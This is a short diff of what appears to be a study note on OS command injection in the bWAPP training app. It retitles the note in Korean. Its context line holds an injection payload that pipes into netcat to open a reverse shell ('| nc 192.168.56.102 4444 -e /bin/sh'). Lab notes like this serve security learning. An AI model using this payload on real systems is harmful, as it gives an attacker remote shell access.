@@ -1,4 +1,4 @@
-# OS\_Command\_Injection
+# OS 커맨드 인젝션 (bWAPP)
 
 ```
 | nc 192.168.56.102 4444 -e /bin/sh
